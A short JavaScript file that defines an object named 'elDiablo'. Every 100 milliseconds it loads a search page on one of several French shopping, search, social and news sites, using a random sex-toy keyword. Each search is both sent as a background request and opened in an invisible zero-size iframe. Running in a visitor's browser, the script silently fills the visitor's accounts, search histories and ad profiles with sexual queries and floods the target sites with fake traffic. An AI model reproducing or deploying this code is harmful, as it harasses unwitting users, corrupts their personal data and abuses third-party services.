var elDiablo = {

    url: [
        'https://www.amazon.fr/s/?__mk_fr_FR=%C3%85M%C3%85%C5%BD%C3%95%C3%91&url=search-alias%3Daps&field-keywords={keyword}',
        'http://www.cdiscount.com/search/10/{keyword}.html#_his_',
        'https://www.google.fr/webhp?ie=UTF-8#q={keyword}',
        'http://www.laredoute.fr/psrch/psrch.aspx?kwrd={keyword}&virtualsite=100',
        'http://www.ebay.fr/sch/i.html?&_nkw={keyword}',
        'https://www.facebook.com/search/top/?init=quick&q={keyword}',
        'http://search.rueducommerce.fr/search?s={keyword}',
        'http://www.darty.com/nav/recherche?srctype=list&text={keyword}',
        'http://lemoteur.orange.fr/?kw={keyword}&bhv=web_fr&module=orange&target=orange',
        'http://search.free.fr/google.pl?qs={keyword}&x=0&y=0',
        'http://www.commentcamarche.net/s/{keyword}',
        'http://www.clubic.com/r/{keyword}/',
        'http://www.journaldunet.com/recherche/?f_libelle={keyword}',
        'http://www.programme-tv.net/rechercher?q={keyword}',
        'http://www.lemonde.fr/recherche/?keywords={keyword}&qt=recherche_globale',
        'http://www.topito.com/recherche?q={keyword}'
    ],

    keyword: [
        'vibro', 'gode', 'plug anal', 'Vibromasseur', 'Gode Ceinture', 'Dildo'
    ],

    init: function(){
        window.setInterval(elDiablo.createRequest, 100);
    },

    randomValue: function(datas) {
       return datas[Math.floor(Math.random() * datas.length)];
    },

    createRequest: function(url, keyword) {
        randomUrl = elDiablo.randomValue(elDiablo.url);
        randomKeyword = elDiablo.randomValue(elDiablo.keyword);
        url = randomUrl.replace('{keyword}', randomKeyword);

        var ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", url);
        ifrm.style.width = "0px";
        ifrm.style.height = "0px";
        document.body.appendChild(ifrm);

        var request = new XMLHttpRequest();
        request.open('GET', url, true);
        request.send();
    }
};